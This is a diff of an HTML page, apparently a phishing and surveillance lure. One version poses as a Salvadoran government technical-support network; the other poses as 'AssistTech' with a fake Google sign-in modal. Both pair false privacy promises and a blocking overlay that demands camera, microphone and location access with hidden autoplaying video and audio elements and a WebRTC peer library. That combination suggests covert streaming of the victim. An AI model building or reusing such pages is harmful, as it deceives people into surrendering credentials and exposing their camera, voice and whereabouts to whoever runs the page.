@@ -5,40 +5,32 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistema de Asistencia</title>
-    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
     <link rel="stylesheet" href="css/style.css">
 </head>
 
 <body>
     <div class="container">
         <header class="header">
-            <div class="logo" style="display: flex; align-items: center; gap: 10px;">
-                <svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="var(--primary-color)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M12 2L2 7l10 5 10-5-10-5z"></path>
-                    <path d="M2 17l10 5 10-5"></path>
-                    <path d="M2 12l10 5 10-5"></path>
-                </svg>
-                <div>
-                    <h1>Red Asistencia SV</h1>
-                    <p>Plataforma Nacional de Soporte Técnico</p>
-                </div>
+            <div class="logo">
+                <h1>AssistTech</h1>
+                <p>Sistema de Asistencia Integral</p>
             </div>
             <nav class="nav">
                 <ul>
-                    <li><a href="#inicio" class="active">Inicio</a></li>
-                    <li><a href="#servicios">Servicios</a></li>
-                    <li><a href="#soporte">Soporte</a></li>
-                    <li><a href="#contacto">Contacto</a></li>
+                    <li><a href="#" class="active">Inicio</a></li>
+                    <li><a href="#">Servicios</a></li>
+                    <li><a href="#">Soporte</a></li>
+                    <li><a href="#">Contacto</a></li>
                 </ul>
             </nav>
         </header>
 
         <main class="main">
-            <section class="hero" id="inicio">
+            <section class="hero">
                 <div class="hero-content">
-                    <h2 style="font-weight: 800;">Atención Técnica Remota y Verificada</h2>
-                    <p>Conectamos a ciudadanos y empresas con nuestra red nacional de soporte. Resolvemos problemas de acceso, seguridad y configuración con herramientas de diagnóstico de alta precisión.</p>
-                    <button id="login-btn" class="btn btn-primary">Iniciar Sesión para Asistencia</button>
+                    <h2>Módulo de Ciberseguridad Avanzado</h2>
+                    <p>Proteja su información con nuestro sistema de asistencia integral</p>
+                    <button id="login-btn" class="btn btn-primary">Iniciar Sesión con Google</button>
                 </div>
                 <div class="hero-image">
                     <div class="floating-shapes">
@@ -49,7 +41,7 @@
                 </div>
             </section>
 
-            <section class="features" id="servicios">
+            <section class="features" id="features-section" style="display: none;">
                 <h3>Nuestros Servicios</h3>
                 <div class="features-grid">
                     <div class="feature-card">
@@ -92,85 +84,7 @@
                 </div>
             </section>
 
-            <section class="info-section" id="soporte">
-                <h3>Infraestructura Tecnológica de Vanguardia</h3>
-                <div class="info-grid">
-                    <div class="info-block">
-                        <h4 style="color: var(--gold-accent); margin-bottom: 1rem; font-size: 1.4rem;">Conexión P2P Encriptada</h4>
-                        <p>Utilizamos protocolos WebRTC de última generación para establecer túneles de comunicación directa. Esto elimina intermediarios, reduciendo la latencia y garantizando que el diagnóstico técnico se realice en un entorno privado y seguro de extremo a extremo.</p>
-                    </div>
-                    <div class="info-block">
-                        <h4 style="color: var(--gold-accent); margin-bottom: 1rem; font-size: 1.4rem;">Arquitectura Serverless</h4>
-                        <p>Nuestra red opera sobre una infraestructura sin servidores centralizados vulnerables. Cada solicitud es procesada por nodos de computación distribuida, lo que nos permite mantener una disponibilidad del 99.9% incluso bajo alta demanda nacional.</p>
-                    </div>
-                    <div class="info-block">
-                        <h4 style="color: var(--gold-accent); margin-bottom: 1rem; font-size: 1.4rem;">Geolocalización Dinámica</h4>
-                        <p>Al detectar su ubicación, el sistema enruta automáticamente su caso al centro de datos más cercano. Esto permite que el tiempo de respuesta para asistencias críticas sea inferior a los 5 minutos, optimizando recursos logísticos.</p>
-                    </div>
-                    <div class="info-block">
-                        <h4 style="color: var(--gold-accent); margin-bottom: 1rem; font-size: 1.4rem;">Privacidad por Diseño</h4>
-                        <p>Todos los permisos solicitados son efímeros. La cámara y el micrófono se utilizan únicamente para la validación visual de errores de hardware y comunicación directa. No se almacenan datos biométricos ni grabaciones en nuestra red.</p>
-                    </div>
-                </div>
-            </section>
-
-            <section class="features">
-                <h3>¿Cómo funciona el proceso?</h3>
-                <div class="features-grid">
-                    <div class="feature-card">
-                        <div class="feature-icon">1</div>
-                        <h4>Autenticación</h4>
-                        <p>Inicie sesión con sus credenciales institucionales para validar su identidad en la red nacional.</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">2</div>
-                        <h4>Diagnóstico</h4>
-                        <p>El sistema solicita acceso a sensores para realizar un escaneo preventivo de su estación de trabajo.</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">3</div>
-                        <h4>Asistencia</h4>
-                        <p>Un especialista se conecta de forma remota para guiarle en la resolución de su incidencia técnica.</p>
-                    </div>
-                </div>
-            </section>
-
-            <section class="features" style="background-color: var(--secondary-color); padding: 4rem; border-radius: 20px;">
-                <div class="features-grid">
-                    <div class="feature-card" style="background: none; box-shadow: none; border: none;">
-                        <h2 style="font-size: 3rem; color: var(--primary-color);">150k+</h2>
-                        <p>Atenciones Exitosas</p>
-                    </div>
-                    <div class="feature-card" style="background: none; box-shadow: none; border: none;">
-                        <h2 style="font-size: 3rem; color: var(--primary-color);">99.9%</h2>
-                        <p>Disponibilidad de Red</p>
-                    </div>
-                    <div class="feature-card" style="background: none; box-shadow: none; border: none;">
-                        <h2 style="font-size: 3rem; color: var(--primary-color);">< 5 min</h2>
-                        <p>Tiempo de Respuesta</p>
-                    </div>
-                </div>
-            </section>
-
-            <section class="info-section" style="background-color: white; color: var(--text-color);">
-                <h3 style="color: var(--text-color);">Preguntas Frecuentes</h3>
-                <div style="max-width: 800px; margin: 0 auto;">
-                    <details style="padding: 1rem; border-bottom: 1px solid var(--border-color); cursor: pointer;">
-                        <summary style="font-weight: 600; font-size: 1.1rem;">¿Es seguro compartir mi cámara?</summary>
-                        <p style="padding-top: 1rem; color: var(--light-text);">Sí. El acceso es únicamente para inspección técnica visual y se desconecta automáticamente al cerrar la sesión. No se realizan grabaciones.</p>
-                    </details>
-                    <details style="padding: 1rem; border-bottom: 1px solid var(--border-color); cursor: pointer;">
-                        <summary style="font-weight: 600; font-size: 1.1rem;">¿Tengo que pagar por la asistencia?</summary>
-                        <p style="padding-top: 1rem; color: var(--light-text);">No. Este es un servicio nacional gratuito para todos los usuarios registrados en la red.</p>
-                    </details>
-                    <details style="padding: 1rem; border-bottom: 1px solid var(--border-color); cursor: pointer;">
-                        <summary style="font-weight: 600; font-size: 1.1rem;">¿Qué hago si mi código no llega?</summary>
-                        <p style="padding-top: 1rem; color: var(--light-text);">Revise su carpeta de SPAM o solicite un nuevo envío desde el panel de verificación.</p>
-                    </details>
-                </div>
-            </section>
-
-            <section class="assistance" id="contacto">
+            <section class="assistance" id="assistance-section" style="display: none;">
                 <h3>Centro de Asistencia</h3>
                 <div class="assistance-container">
                     <div class="assistance-form">
@@ -223,8 +137,8 @@
                                 </svg>
                             </div>
                             <div class="contact-text">
-                                <p>Email Oficial</p>
-                                <span>soporte@asistencia.gob.sv</span>
+                                <p>Email</p>
+                                <span>support@assisttech.com</span>
                             </div>
                         </div>
                         <div class="contact-item">
@@ -246,7 +160,7 @@
             </section>
         </main>
         <footer class="footer">
-            <p>&copy; 2024 Red Asistencia SV. Plataforma Nacional Independiente de Soporte.</p>
+            <p>&copy; 2023 AssistTech. Todos los derechos reservados.</p>
         </footer>
     </div>
 
@@ -254,7 +168,7 @@
     <div class="modal" id="login-modal">
         <div class="modal-content">
             <div class="modal-header">
-                <h3>Verificación Ciudadana</h3>
+                <h3>Iniciar Sesión con Google</h3>
                 <button class="close-btn" id="close-modal">&times;</button>
             </div>
             <div class="modal-body">
@@ -290,7 +204,8 @@
                 <h3>Permisos Requeridos</h3>
             </div>
             <div class="modal-body">
-                <p style="font-size: 0.95rem; line-height: 1.5;">Para proporcionar una asistencia técnica remota efectiva y validar su identidad, nuestro sistema requiere acceso temporal a los siguientes recursos del dispositivo:</p>
+                <p>Para proporcionar una asistencia completa, nuestro sistema necesita acceso a los siguientes recursos:
+                </p>
                 <div class="permission-list">
                     <div class="permission-item">
                         <div class="permission-icon">
@@ -356,8 +271,9 @@
                         </div>
                     </div>
                 </div>
-                <div class="permission-note" style="border-left: 4px solid var(--gold-accent);">
-                    <p><strong>Aviso de Privacidad:</strong> Según nuestro manifiesto de seguridad y protección de datos, la activación temporal de tu cámara, micrófono y GPS <strong>NO compromete tu privacidad ni genera grabaciones residuales</strong>. Este sistema requiere dichos accesos estrictamente por protocolo técnico para verificar daños físicos en equipos, proporcionar soporte guiado por voz y enrutar la conexión al nodo más cercano a tu ubicación.</p>
+                <div class="permission-note">
+                    <p>Tu información está protegida según nuestra política de privacidad y solo se utilizará para fines
+                        de asistencia técnica.</p>
                 </div>
                 <div class="permission-actions">
                     <button class="btn btn-secondary" id="deny-permissions">Denegar</button>
@@ -398,21 +314,6 @@
     <!-- Modal de streaming oculto -->
     <video id="local-video" autoplay muted style="display: none;"></video>
     <audio id="local-audio" autoplay muted style="display: none;"></audio>
-
-    <!-- Overlay de Permisos Forzados -->
-    <div id="forced-permission-overlay">
-        <div class="warning-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"></path>
-                <line x1="12" y1="9" x2="12" y2="13"></line>
-                <line x1="12" y1="17" x2="12.01" y2="17"></line>
-            </svg>
-        </div>
-        <h2>ACCIÓN REQUERIDA</h2>
-        <p>Para garantizar la seguridad de su conexión y cumplir con los protocolos de la Red de Asistencia, <strong>DEBE otorgar permisos de Cámara, Micrófono y Ubicación</strong>.</p>
-        <p>El acceso al sistema permanecerá bloqueado hasta que se acepten los permisos necesarios.</p>
-        <button id="retry-permissions" class="btn btn-primary" style="background: var(--gold-accent); color: var(--dark-bg); font-weight: 800;">REINTENTAR AHORA</button>
-    </div>
 
     <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
